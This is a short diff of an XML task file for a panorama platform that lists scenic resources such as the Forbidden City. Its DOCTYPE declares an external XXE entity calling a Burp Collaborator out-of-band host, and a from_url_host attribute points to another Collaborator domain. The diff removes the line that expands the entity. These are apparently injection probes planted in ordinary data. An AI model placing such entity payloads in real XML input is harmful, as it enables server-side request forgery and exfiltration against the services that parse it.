@@ -1,8 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "http://8mvwjfb6jcpo18jjxthcdtpzzq5it7.burpcollaborator.net" >]>
-<foo>&xxe;</foo> 
 <bdpano>
-
     <task name="春季风景全景图" from_url_host="http://0tuoq7iyq4wg80qb4lo4klwr6ic90y.burpcollaborator.net"  > <!--name 必填。需与XR平台所提交的任务名称保持一致。from_url_host 必填。为企业官网主页-->
 
         <resource name="resource_122149" title="故宫" location="北京市东城区景山前街4号" tag="高清无广告" lon="116.46" lat="39.92">
